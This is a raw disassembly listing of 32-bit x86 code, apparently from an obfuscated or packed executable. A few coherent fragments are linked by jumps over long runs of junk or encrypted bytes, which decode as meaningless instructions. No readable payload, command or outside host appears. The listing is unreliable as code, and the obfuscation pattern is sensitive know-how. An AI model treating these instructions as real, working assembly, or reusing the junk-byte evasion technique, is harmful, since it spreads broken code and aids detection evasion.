  40f10c:	outs   dx,DWORD PTR ds:[esi]
  40f10d:	mov    BYTE PTR [ecx+0x6],cl
  40f110:	iret   
  40f111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f112:	repz mov dl,BYTE PTR [eax+0x76]
  40f116:	or     al,0xde
  40f118:	cmovbe edx,DWORD PTR [ebx-0x42f86d31]
  40f11f:	pusha  
  40f120:	in     eax,0xa3
  40f122:	nop
  40f123:	rep ins BYTE PTR es:[edi],dx
  40f125:	shl    DWORD PTR [ebx+0x3fe2552],0x43
  40f12c:	cmp    DWORD PTR [ebp+0xf],0xf612f944
  40f133:	jl     0x40f120
  40f135:	(bad)  [edx-0x768139eb]
  40f13b:	or     eax,0x2b7ccc7d
  40f140:	packsswb mm2,mm5
  40f143:	mov    ah,0x8d
  40f145:	push   edx
  40f146:	leave  
  40f147:	shl    DWORD PTR [ebp-0x5d],0x2a
  40f14b:	push   esi
  40f14c:	gs clc 
  40f14e:	sbb    eax,eax
  40f150:	cmp    eax,0x840fcb13
  40f155:	js     0x40f158
  40f157:	add    BYTE PTR [eax],al
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [eax],ebx
  40f16e:	(bad)  
  40f170:	lods   al,BYTE PTR ds:[esi]
  40f171:	mov    ds:0xc37070aa,eax
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1e4
  40f17a:	or     BYTE PTR [edi-0x80],ah
  40f17d:	lahf   
  40f17e:	std    
  40f17f:	rol    BYTE PTR [ecx-0x6c24c07c],0x69
  40f186:	ret    
  40f187:	xchg   ebx,eax
  40f188:	xor    BYTE PTR [eax-0xe],dh
  40f18b:	push   edx
  40f18c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f18d:	push   ebp
  40f18e:	mov    BYTE PTR [ecx+edi*4+0x65037fe8],cl
  40f195:	aaa    
  40f196:	stos   BYTE PTR es:[edi],al
  40f197:	jb     0x40f177
  40f199:	rol    bh,cl
  40f19b:	imul   esp,ebp,0x64f97a78
  40f1a1:	and    BYTE PTR [ecx],dl
  40f1a3:	cmp    ch,BYTE PTR [ebp-0x5f7aa1f1]
  40f1a9:	xchg   edi,eax
  40f1aa:	fstp   QWORD PTR [edx+0x35d06cbc]
  40f1b0:	cmp    BYTE PTR [edx-0x3],dh
  40f1b3:	mov    edi,0x18396e82
  40f1b8:	in     eax,0x39
  40f1ba:	(bad)  
  40f1bb:	(bad)  [edx-0x1234c8cb]
  40f1c1:	imul   esi,DWORD PTR [ebx],0x7c
  40f1c4:	inc    ebp
  40f1c5:	out    dx,al
  40f1c6:	jg     0x40f238
  40f1c8:	lahf   
  40f1c9:	(bad)  
  40f1ca:	enter  0xfc6,0x89
  40f1ce:	cdq    
  40f1cf:	or     eax,0xcd42b333
  40f1d4:	xchg   DWORD PTR [edi-0x12],esp
  40f1d7:	inc    edi
  40f1d8:	jmp    0x40f255
  40f1da:	jb     0x40f1b7
  40f1dc:	int3   
  40f1dd:	sub    al,0xe0
  40f1df:	xor    eax,0x4380527b
  40f1e4:	dec    eax
  40f1e5:	aam    0x2f
  40f1e7:	add    cl,BYTE PTR [esi+0x7344e1b8]
  40f1ed:	adc    BYTE PTR ds:0xe01222b2,0x63
  40f1f4:	scas   al,BYTE PTR es:[edi]
  40f1f5:	inc    esp
  40f1f6:	mov    esp,0x14b4230d
  40f1fb:	mov    bl,0x7f
  40f1fd:	and    al,0xec
  40f1ff:	or     dl,bh
  40f201:	stos   BYTE PTR es:[edi],al
  40f202:	ds loop 0x40f213
  40f205:	pop    ss
  40f206:	div    BYTE PTR [esp+esi*4-0x43]
  40f20a:	mul    ecx
  40f20c:	cdq    
  40f20d:	fsubr  QWORD PTR [eax+0x7fee4ce8]
  40f213:	sbb    eax,0x820093c7
  40f218:	inc    ebp
  40f219:	inc    ebx
  40f21a:	sar    DWORD PTR [edi-0x44382775],1
  40f220:	xor    DWORD PTR [esi+0x19],0xe4de403f
  40f227:	arpl   bp,sp
  40f229:	sbb    al,0x90
  40f22b:	inc    edx
  40f22c:	loopne 0x40f265
  40f22e:	xchg   esp,eax
  40f22f:	sub    eax,0xf42cccfe
  40f234:	dec    ecx
  40f235:	cmp    DWORD PTR [esi+0x26],esp
  40f238:	mov    ds,WORD PTR [eax-0x5e]
  40f23b:	inc    edi
  40f23c:	in     al,dx
  40f23d:	ret    0xe372
  40f240:	dec    esp
  40f241:	iret   
  40f242:	xor    bl,dl
  40f244:	jp     0x40f1d9
  40f246:	ins    DWORD PTR es:[edi],dx
  40f247:	pusha  
  40f248:	jne    0x40f2a8
  40f24a:	add    dl,BYTE PTR [ecx-0x48d88c60]
  40f250:	shr    BYTE PTR fs:[ecx-0x3],1
  40f254:	repz jmp 0x40f231
  40f257:	icebp  
  40f258:	sbb    al,0xd7
  40f25a:	inc    ebp
  40f25b:	pusha  
  40f25c:	fild   QWORD PTR [edi+0x3a]
  40f25f:	out    0x9d,al
  40f261:	fnsave [ebp-0x214a7937]
  40f267:	push   ebx
  40f268:	sti    
  40f269:	or     eax,DWORD PTR [ebx]
  40f26b:	add    eax,0x86f45719
  40f270:	fsub   DWORD PTR [edi+0x4872827f]
  40f276:	cmp    al,0xd6
  40f278:	cmpps  xmm1,XMMWORD PTR [ecx+0x2ad31e4d],0x3c
  40f280:	les    edx,FWORD PTR [esi-0x3a]
  40f283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f284:	sahf   
  40f285:	cli    
  40f286:	and    ebx,esp
  40f288:	sub    al,0x16
  40f28a:	dec    edi
  40f28b:	pushf  
  40f28c:	clc    
  40f28d:	mov    eax,0x432d89e1
  40f292:	pop    ecx
  40f293:	popa   
  40f294:	sub    BYTE PTR [esi-0x48],ah
  40f297:	sub    al,0xb2
  40f299:	jns    0x40f269
  40f29b:	jge    0x40f294
  40f29d:	pop    esp
  40f29e:	call   0x2be63835
  40f2a3:	ret    
  40f2a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f2a5:	into   
  40f2a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2a7:	cmp    bl,BYTE PTR [esi+0x736ca51]
  40f2ad:	pop    edx
  40f2ae:	mov    dh,0x86
  40f2b0:	or     eax,0x896ea837
  40f2b5:	add    BYTE PTR [ebx-0x264a08de],bh
  40f2bb:	in     al,0x36
  40f2bd:	jmp    0x78af9063
  40f2c2:	push   ebp
  40f2c3:	and    dh,cl
  40f2c5:	int3   
  40f2c6:	mov    DWORD PTR [eax],0x60341e89
  40f2cc:	jmp    0x40f7b6
  40f2d1:	mov    eax,DWORD PTR [ebp+0x8]
  40f2d4:	mov    ecx,DWORD PTR [ebp-0x8]
  40f2d7:	xor    eax,esi
  40f2d9:	add    eax,edi
  40f2db:	cmp    DWORD PTR [ecx],eax
  40f2dd:	je     0x40f79e
  40f2e3:	mov    ecx,DWORD PTR [ebp-0x18]
  40f2e6:	jmp    0x40f450
  40f2eb:	dec    ebx
  40f2ec:	int3   
  40f2ed:	cmp    esi,ecx
  40f2ef:	mov    ecx,0x99494bcd
  40f2f4:	add    dh,ch
  40f2f6:	shl    BYTE PTR [esp+edi*1-0x5689fe48],1
  40f2fd:	jo     0x40f36f
  40f2ff:	ret    
  40f300:	jg     0x40f372
  40f302:	jo     0x40f2c6
  40f304:	mov    BYTE PTR [ecx+edi*8+0x7399c96],bh
  40f30b:	cmp    bl,BYTE PTR [esi]
  40f30d:	pop    ds
  40f30e:	pop    edx
  40f30f:	cmp    BYTE PTR [ebx-0xd],dl
  40f312:	inc    edi
  40f313:	and    eax,0xf1c1fcea
  40f318:	push   esi
  40f319:	jg     0x40f353
  40f31b:	pusha  
  40f31c:	ds sub eax,0x6919a7d9
  40f322:	add    al,0xf4
  40f324:	repnz (bad) 
  40f326:	ja     0x40f2be
  40f328:	add    DWORD PTR [edi],ebx
  40f32a:	dec    ebx
  40f32b:	fwait
  40f32c:	repnz inc DWORD PTR [edi+0x12]
  40f330:	pop    ebx
  40f331:	xchg   DWORD PTR [eax+0x67],edx
  40f334:	(bad)  
  40f335:	iret   
  40f336:	dec    edx
  40f337:	fs xlat BYTE PTR gs:[ebx]
  40f33a:	int3   
  40f33b:	add    edi,esi
  40f33d:	jp     0x40f390
  40f33f:	cmp    al,0x53
  40f342:	shl    DWORD PTR [edi],cl
  40f344:	cli    
  40f345:	mov    cl,0x70
  40f347:	xchg   esp,eax
  40f348:	fdivr  QWORD PTR [ecx+0xb]
  40f34b:	inc    edx
  40f34c:	loop   0x40f369
  40f34e:	cmp    edi,DWORD PTR [edx]
  40f350:	(bad)  
  40f351:	cmp    eax,0x7fb4f149
  40f356:	dec    edx
  40f357:	push   ebx
  40f358:	dec    esp
  40f359:	icebp  
  40f35a:	inc    ebx
  40f35b:	call   0x83c5:0xfec0e978
  40f362:	fcmovnbe st,st(5)
  40f364:	inc    ebx
  40f365:	sub    eax,0x6aab7d62
  40f36a:	sahf   
  40f36b:	mov    edx,0x19649f40
  40f370:	sbb    eax,0x2f096c11
  40f375:	sahf   
  40f376:	xchg   ebp,eax
  40f377:	xchg   ebp,eax
  40f378:	inc    ebp
  40f379:	and    bh,bh
  40f37b:	out    dx,eax
  40f37c:	cmp    eax,0x18d7c292
  40f381:	dec    ebx
  40f382:	fisub  WORD PTR [esi+0x450b0f8c]
  40f388:	mov    al,0x16
  40f38a:	je     0x40f40a
  40f38c:	rol    bl,cl
  40f38e:	sub    al,0x8b
  40f390:	or     dh,BYTE PTR [edi-0xcd62589]
  40f396:	cmc    
  40f397:	or     al,0x68
  40f399:	cwde   
  40f39a:	lea    ecx,[ecx]
  40f39c:	ins    DWORD PTR es:[edi],dx
  40f39d:	push   ss
  40f39e:	call   0x6271:0xdfda5ff9
  40f3a5:	dec    edi
  40f3a6:	loop   0x40f33a
  40f3a8:	outs   dx,BYTE PTR ds:[esi]
  40f3a9:	mov    ecx,0x2b5103cb
  40f3ae:	nop
  40f3af:	retf   
  40f3b0:	jb     0x40f37c
  40f3b2:	inc    ebx
  40f3b3:	cdq    
  40f3b4:	push   cs
  40f3b5:	rcl    ah,cl
  40f3b7:	cmp    eax,DWORD PTR [ecx+0x3360392a]
  40f3bd:	aaa    
  40f3be:	add    cl,dh
  40f3c0:	sar    esi,1
  40f3c2:	jns    0x40f34a
  40f3c4:	test   BYTE PTR [esi-0x7e],al
  40f3c7:	sbb    DWORD PTR ds:0x8633e730,edi
  40f3cd:	loope  0x40f3ff
  40f3cf:	fnsave [ecx+0xf]
  40f3d2:	pop    edx
  40f3d3:	out    0xce,eax
  40f3d5:	hlt    
  40f3d6:	fld    st(5)
  40f3d8:	jb     0x40f365
  40f3da:	cmp    eax,0x25f71a21
  40f3df:	add    eax,0xf58c7d89
  40f3e4:	retf   0xeeb9
  40f3e7:	dec    DWORD PTR [ebx+0x32]
  40f3ea:	lock add ebp,edi
  40f3ed:	iret   
  40f3ee:	mov    ebx,0x34a75475
  40f3f3:	call   0xfd03:0xaa041ad0
  40f3fa:	fbld   TBYTE PTR [ebx-0x325f7b22]
  40f400:	pop    es
  40f401:	cmp    eax,0x130f8354
  40f406:	out    0x6e,eax
  40f408:	jle    0x40f3c4
  40f40a:	xchg   ebx,eax
  40f40b:	push   eax
  40f40c:	es ret 
  40f40e:	leave  
  40f40f:	cmp    eax,0xd2b76b02
  40f414:	xchg   DWORD PTR [ebx+0x79f68bf4],esi
  40f41a:	push   cs
  40f41b:	mov    bl,0x67
  40f41d:	jno    0x40f3be
  40f41f:	int    0x2d
  40f421:	stos   DWORD PTR es:[edi],eax
  40f422:	adc    esp,DWORD PTR ds:0xb932d36f
  40f428:	pop    ds
  40f429:	push   esi
  40f42a:	mov    edi,DWORD PTR [ecx]
  40f42c:	sub    edi,DWORD PTR [ebp-0x4b385bae]
  40f432:	inc    edx
  40f433:	mov    ?,WORD PTR [ecx+0x41e05831]
  40f439:	push   ss
  40f43a:	in     eax,dx
  40f43b:	push   ebp
  40f43c:	sub    eax,0x453d1f40
  40f441:	popf   
  40f442:	adc    ch,bh
  40f444:	shl    dl,cl
  40f446:	aad    0x63
  40f448:	push   ds
  40f449:	dec    ebx
  40f44a:	pop    ebx
  40f44b:	xchg   esp,eax
  40f44c:	loopne 0x40f3d2
  40f44e:	lock cld 
  40f450:	mov    eax,DWORD PTR [ebp-0x8]
  40f453:	jmp    0x40f5bd
  40f458:	inc    eax
  40f459:	gs ror ch,cl
  40f45c:	icebp  
  40f45d:	imul   edx,DWORD PTR [ebx+0x65],0x2966c4cb
  40f464:	inc    esp
  40f465:	mov    edi,0xb7393dda
  40f46a:	jo     0x40f4dc
  40f46c:	ret    
  40f46d:	jg     0x40f4df
  40f46f:	jo     0x40f40f
  40f471:	mov    edx,0x4c5062cd
  40f476:	das    
  40f477:	cmp    al,0x15
  40f479:	pop    esi
  40f47a:	fadd   DWORD PTR [eax]
  40f47c:	mov    eax,0xffe7a821
  40f481:	xor    DWORD PTR [esi-0x53],esp
  40f484:	rcl    BYTE PTR [esi+0x2c5f8abd],cl
  40f48a:	hlt    
  40f48b:	cld    
  40f48c:	dec    ebx
  40f48d:	dec    edi
  40f48e:	hlt    
  40f48f:	(bad)  
  40f490:	iret   
  40f491:	and    al,BYTE PTR [esi]
  40f493:	pop    eax
  40f494:	cmp    al,0xbd
  40f496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f497:	mov    al,0x4d
  40f499:	call   0x99597229
  40f49e:	ds mov dl,dl
  40f4a1:	inc    ecx
  40f4a2:	jle    0x40f4b4
  40f4a4:	in     al,0x39
  40f4a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4a7:	int    0x80
  40f4a9:	pop    edi
  40f4aa:	ds adc eax,0xc009a15e
  40f4b0:	ins    BYTE PTR es:[edi],dx
  40f4b1:	rcl    DWORD PTR [edx],0xb5
  40f4b4:	or     eax,0x4fa52f08
  40f4b9:	fs mov ah,0x40
  40f4bc:	ja     0x40f4f7
  40f4be:	dec    eax
  40f4bf:	inc    ebp
  40f4c0:	dec    edx
  40f4c1:	dec    edx
  40f4c2:	and    eax,0xff67d0f3
  40f4c7:	popa   
  40f4c8:	push   ebp
  40f4c9:	xor    BYTE PTR [edi+0x282fe5f6],0x43
  40f4d0:	inc    DWORD PTR [edx+0x56]
  40f4d3:	dec    edi
  40f4d4:	sub    eax,DWORD PTR ds:0xccf5aaf3
  40f4da:	js     0x40f4bb
  40f4dc:	push   0x3e18f9d4
  40f4e1:	mov    edi,0xd8492f53
  40f4e6:	jb     0x40f4cb
  40f4e8:	pop    si
  40f4ea:	xor    al,0x82
  40f4ec:	mov    bh,0x4f
  40f4ee:	xchg   esp,eax
  40f4ef:	push   ss
  40f4f0:	rol    ch,0x92
  40f4f3:	push   esi
  40f4f4:	xchg   ebp,eax
  40f4f5:	pop    ds
  40f4f6:	test   al,0x31
  40f4f8:	adc    eax,0xbf94f545
  40f4fd:	and    BYTE PTR [ebx+0xb],bl
  40f500:	jmp    0x7e7b:0xb0d0e9bc
  40f507:	lock lods eax,DWORD PTR ds:[esi]
  40f509:	adc    ebp,DWORD PTR [ecx]
  40f50b:	popf   
  40f50c:	mov    ecx,0x52f9ff0a
  40f511:	call   edx
  40f513:	daa    
  40f514:	test   BYTE PTR [eax],al
  40f516:	jmp    0x901a477a
  40f51b:	cdq    
  40f51c:	js     0x40f586
  40f51e:	mov    ebx,0x20dfe7a8
  40f523:	xor    al,BYTE PTR [eax+0x76]
  40f526:	int3   
  40f527:	pop    ecx
  40f528:	dec    edx
  40f529:	and    bh,dl
  40f52b:	add    eax,0x7cecc8c
  40f530:	push   eax
  40f531:	pop    ecx
  40f532:	sub    edx,DWORD PTR [ebx+0x1d]
  40f535:	lods   eax,DWORD PTR ds:[esi]
  40f536:	and    DWORD PTR [ebx+esi*1],esi
  40f539:	nop
  40f53a:	addr16 std 
  40f53c:	jecxz  0x40f4f0
  40f53e:	adc    DWORD PTR [esi],edi
  40f540:	mov    BYTE PTR [ebx],bh
  40f542:	mov    DWORD PTR [esi-0x5f],ecx
  40f545:	sub    al,0xdd
  40f547:	dec    ebx
  40f548:	adc    dh,bh
  40f54a:	add    eax,0x17a05dcd
  40f54f:	enter  0x9aff,0x4f
  40f553:	and    al,0xdd
  40f555:	sub    al,0xd5
  40f557:	add    al,0xd
  40f559:	fwait
  40f55a:	in     eax,0x6d
  40f55c:	pop    esi
  40f55d:	pushf  
  40f55e:	ret    
  40f55f:	out    dx,al
  40f560:	lods   al,BYTE PTR ds:[esi]
  40f561:	scas   al,BYTE PTR es:[edi]
  40f562:	cwde   
  40f563:	pop    eax
  40f564:	jne    0x40f503
  40f566:	sbb    DWORD PTR [edi],esi
  40f568:	pusha  
  40f569:	stos   BYTE PTR es:[edi],al
  40f56a:	retf   
  40f56b:	cmp    eax,ebx
  40f56d:	pop    edx
  40f56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f56f:	xchg   edi,eax
  40f570:	xchg   esi,eax
  40f571:	mov    BYTE PTR [edi],dh
  40f573:	sbb    bh,BYTE PTR [ebx]
  40f575:	inc    ebp
  40f576:	lods   al,BYTE PTR ds:[esi]
  40f577:	pushf  
  40f578:	fisttp QWORD PTR [eax+0x513cce5]
  40f57e:	out    dx,al
  40f57f:	into   
  40f580:	icebp  
  40f581:	add    eax,0x9e61f419
  40f586:	push   esp
  40f587:	jmp    0x5b09:0xabaef9d8
  40f58e:	test   ebp,ebx
  40f590:	es cli 
  40f592:	jb     0x40f51e
  40f594:	and    edi,DWORD PTR [ebx]
  40f596:	mov    ch,0xa6
  40f598:	jne    0x40f564
  40f59a:	test   DWORD PTR [eax-0x10],ebp
  40f59d:	daa    
  40f59e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f59f:	and    ah,dl
  40f5a1:	sahf   
  40f5a2:	mov    WORD PTR [esi+0x69],cs
  40f5a5:	call   esi
  40f5a7:	ins    BYTE PTR es:[edi],dx
  40f5a8:	not    DWORD PTR [esi+0x64]
  40f5ab:	stos   DWORD PTR es:[edi],eax
  40f5ac:	mov    ebx,DWORD PTR [edi]
  40f5ae:	and    edi,esp
  40f5b0:	jp     0x40f5a1
  40f5b2:	sbb    BYTE PTR [ebx],al
  40f5b4:	jmp    0x40f536
  40f5b6:	(bad)  
  40f5b8:	xchg   edx,eax
  40f5b9:	push   0x58
  40f5bb:	imul   ecx,edx,0x408b008b
  40f5c1:	cmp    al,0x8d
  40f5c3:	or     al,0xcd
  40f5c5:	js     0x40f5c7
  40f5c7:	add    BYTE PTR [eax],al
  40f5c9:	add    eax,ecx
  40f5cb:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5ce:	mov    ecx,DWORD PTR [ecx]
  40f5d0:	mov    eax,DWORD PTR [eax+ecx*1]
  40f5d3:	mov    DWORD PTR [ebp-0x20],eax
  40f5d6:	mov    eax,DWORD PTR [ebp+0x8]
  40f5d9:	xor    eax,esi
  40f5db:	add    eax,edi
  40f5dd:	mov    DWORD PTR [ebp-0x24],eax
  40f5e0:	mov    eax,DWORD PTR [ebp+0x8]
  40f5e3:	mov    ecx,DWORD PTR [ebp-0x20]
  40f5e6:	xor    eax,esi
  40f5e8:	add    eax,edi
  40f5ea:	cmp    ecx,eax
  40f5ec:	je     0x40f7b6
  40f5f2:	jmp    0x40f75c
  40f5f7:	pop    ebx
  40f5f8:	out    dx,al
  40f5f9:	dec    ebp
  40f5fa:	mov    bl,0x49
  40f5fc:	mov    bl,0x61
  40f5fe:	test   BYTE PTR [edx+0xc],0x5a
  40f602:	dec    ebx
  40f603:	or     ebx,DWORD PTR [edi-0x23]
  40f606:	dec    eax
  40f607:	mov    WORD PTR [esi+0x7fc37070],?
  40f60d:	jo     0x40f67f
  40f60f:	sub    al,0x64
  40f611:	xchg   ebx,eax
  40f612:	popf   
  40f613:	mov    eax,ds:0x6b9928e7
  40f618:	mov    eax,DWORD PTR [esi+0x49]
  40f61b:	jnp    0x40f62e
  40f61d:	add    BYTE PTR [eax],bl
  40f61f:	xchg   BYTE PTR [eax+0x82974da],dl
  40f625:	mov    DWORD PTR [edi],ebp
  40f627:	loopne 0x40f5bd
  40f629:	cmp    DWORD PTR ds:0x7d043f48,esi
  40f62f:	mov    edi,0x8e46097
  40f634:	inc    esp
  40f635:	cmovp  ebx,DWORD PTR [eax]
  40f638:	sub    DWORD PTR [ecx-0x76],edi
  40f63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f63c:	test   DWORD PTR [ebx-0x224c4deb],esp
  40f642:	mov    ds:0xf9c371e9,eax
  40f647:	adc    ah,BYTE PTR [eax]
  40f649:	cli    
  40f64a:	push   cs
  40f64b:	xchg   ebx,eax
  40f64c:	push   0x17b4f05d
  40f651:	jg     0x40f5d7
  40f653:	stos   DWORD PTR es:[edi],eax
  40f654:	and    al,0x3b
  40f656:	add    al,0x4b
  40f658:	sub    ch,BYTE PTR [ebx+0x4d]
  40f65b:	push   es
  40f65c:	xor    edi,DWORD PTR [edi-0x5c94ab62]
  40f662:	push   ebx
  40f663:	and    edx,DWORD PTR [ebx+0x1e]
  40f666:	fistp  DWORD PTR [eax+0x7f]
  40f669:	es fcomp st(0)
  40f66c:	enter  0xabb7,0x6d
  40f670:	lea    ecx,[edx-0x28f3e03]
  40f676:	into   
  40f677:	inc    edx
  40f678:	ins    BYTE PTR es:[edi],dx
  40f679:	xchg   BYTE PTR [esi+0x7b],dl
  40f67c:	xchg   ecx,eax
  40f67d:	sbb    eax,ebp
  40f67f:	pop    ds
  40f680:	add    eax,0xb1d91fac
  40f685:	dec    edi
  40f686:	icebp  
  40f687:	jne    0x40f6af
  40f689:	mov    ah,0x8e
  40f68b:	retf   0xbfb9
  40f68e:	mov    BYTE PTR [edi+edx*1+0x7d],al
  40f692:	add    ch,BYTE PTR [eax-0x4e95c5c]
  40f698:	push   es
  40f699:	aad    0x59
  40f69b:	ds js  0x40f6c9
  40f69e:	cmp    BYTE PTR [edx-0x32],0xe9
  40f6a2:	imul   ecx,ecx,0x10
  40f6a5:	inc    ebx
  40f6a6:	add    eax,0xa8b0408c
  40f6ab:	xchg   ebp,eax
  40f6ac:	pop    esp
  40f6ad:	dec    ebx
  40f6ae:	mov    ecx,?
  40f6b0:	fs pop edi
  40f6b2:	test   eax,0xe08f576c
  40f6b7:	pushf  
  40f6b8:	xor    ah,dl
  40f6ba:	jae    0x40f698
  40f6bc:	(bad)  
  40f6bd:	mov    edi,0x938c609f
  40f6c2:	xchg   BYTE PTR [ecx+0x7],bl
  40f6c5:	or     ah,BYTE PTR [esi+0x6c]
  40f6c8:	out    dx,al
  40f6c9:	inc    ebx
  40f6ca:	test   eax,0x13b46bae
  40f6cf:	rol    esi,1
  40f6d1:	fld    QWORD PTR [eax+0x57]
  40f6d4:	add    eax,0x65fe5e36
  40f6d9:	adc    esp,esp
  40f6db:	(bad)  
  40f6dd:	ds and al,0x3c
  40f6e0:	mov    WORD PTR [esi-0x11d73c79],ds
  40f6e6:	mov    esi,0xb4a1e673
  40f6eb:	(bad)  
  40f6ec:	cs in  al,0xd9
  40f6ef:	das    
  40f6f0:	inc    ebp
  40f6f1:	neg    DWORD PTR [eax+ebx*8-0x245c78ea]
  40f6f8:	stos   BYTE PTR es:[edi],al
  40f6f9:	xor    DWORD PTR [ebx],ecx
  40f6fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6fc:	lods   eax,DWORD PTR ds:[esi]
  40f6fd:	xor    BYTE PTR [ebx-0x73f9319f],0x5c
  40f704:	js     0x40f68b
  40f706:	xchg   ecx,eax
  40f707:	pop    es
  40f708:	cmp    ch,BYTE PTR [ebp+0x46]
  40f70b:	push   cs
  40f70c:	(bad)  
  40f70d:	out    dx,eax
  40f70e:	sub    eax,0x9a40d98b
  40f713:	inc    esi
  40f714:	sbb    al,0x84
  40f716:	jp     0x40f6eb
  40f718:	xchg   esi,eax
  40f719:	sub    eax,0x6d70ef1f
  40f71e:	in     al,0x93
  40f720:	outs   dx,BYTE PTR ds:[esi]
  40f721:	cwde   
  40f722:	pop    ebx
  40f723:	inc    ebp
  40f724:	dec    ecx
  40f725:	add    BYTE PTR [edi],al
  40f727:	bound  ecx,QWORD PTR [edx]
  40f729:	ss mov bl,0x9d
  40f72c:	pop    eax
  40f72d:	sub    DWORD PTR [esi+0x57],eax
  40f730:	(bad)  
  40f731:	imul   edi,DWORD PTR [eax],0x418bf37
  40f737:	sbb    al,0xe0
  40f739:	popa   
  40f73a:	je     0x40f73e
  40f73c:	mov    es,WORD PTR [ebp+0x5]
  40f73f:	xlat   BYTE PTR ds:[ebx]
  40f740:	daa    
  40f741:	xchg   ecx,eax
  40f742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f743:	add    cl,dl
  40f745:	pop    ss
  40f746:	scas   eax,DWORD PTR es:[edi]
  40f747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f748:	(bad)  
  40f749:	adc    DWORD PTR [edx+0x56f313db],esi
  40f74f:	sub    BYTE PTR [esi-0x4b],ah
  40f752:	int    0x4d
  40f754:	icebp  
  40f755:	mov    eax,0xdf567105
  40f75a:	retf   
  40f75b:	mov    BYTE PTR [ebx+0x4d8bf845],cl
  40f761:	loopne 0x40f766
  40f763:	or     BYTE PTR [ecx+0x458bdc4d],cl
  40f769:	fmul   QWORD PTR [ebx+0x408bf84d]
  40f76f:	or     al,0x8b
  40f771:	or     DWORD PTR [edx+0x37040804],ecx
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x4b0446f3
  40f7e3:	gs retf 0xb55f
  40f7e7:	jo     0x40f859
  40f7e9:	mov    ds:0x4c70707d,eax
  40f7ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7ef:	xchg   ebx,eax
  40f7f0:	dec    ebx
  40f7f1:	xchg   edi,eax
  40f7f2:	push   esi
  40f7f3:	push   esp
  40f7f4:	jne    0x40f81c
  40f7f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f7f7:	mul    BYTE PTR [ebx]
  40f7f9:	clc    
  40f7fa:	push   esp
  40f7fb:	call   0x9da532ea
  40f800:	sub    edi,ecx
  40f802:	ret    0xe794
  40f805:	ja     0x40f867
  40f807:	xor    BYTE PTR ds:0xfa4bd6a,ah
  40f80d:	repz cld 
  40f80f:	mov    bh,0xf7
  40f811:	jmp    0xca69:0xe2d57871
  40f818:	and    ebp,DWORD PTR [ecx-0x42e01976]
  40f81e:	jl     0x40f7f4
  40f820:	inc    esp
  40f821:	jae    0x40f81d
  40f823:	mov    edx,DWORD PTR [eax+0x14]
  40f826:	iret   
  40f827:	retf   0xf720
  40f82a:	sbb    eax,DWORD PTR ds:0x7f79b14d
  40f830:	xchg   DWORD PTR [ebx-0x4ce29327],eax
  40f836:	js     0x40f7fe
  40f838:	test   DWORD PTR ds:0x7e14d2e8,ecx
  40f83e:	jmp    0x58e40ce5
  40f843:	add    BYTE PTR [ecx+esi*4-0x6e80b10c],bh
  40f84a:	mov    edi,0x76a0bdc9
  40f84f:	fwait
  40f850:	adc    al,0x24
  40f852:	dec    edi
  40f853:	xchg   edi,eax
  40f854:	or     al,0xbf
  40f856:	or     eax,0xbb3a131f
  40f85b:	jl     0x40f85a
  40f85d:	and    edi,0xffffff99
  40f860:	cmp    BYTE PTR [edi+esi*4-0x73],dl
  40f864:	adc    ah,cl
  40f866:	in     al,dx
  40f867:	jne    0x40f86e
  40f869:	lods   eax,DWORD PTR ds:[esi]
  40f86a:	mov    ebp,0x74901d30
  40f86f:	(bad)  
  40f870:	mov    ds:0x67a1a805,eax
  40f875:	adc    DWORD PTR [edi-0x1b7929d],ebx
  40f87b:	pop    ds
  40f87c:	movaps xmm6,XMMWORD PTR ds:0x5790379f
  40f883:	out    0x2d,eax
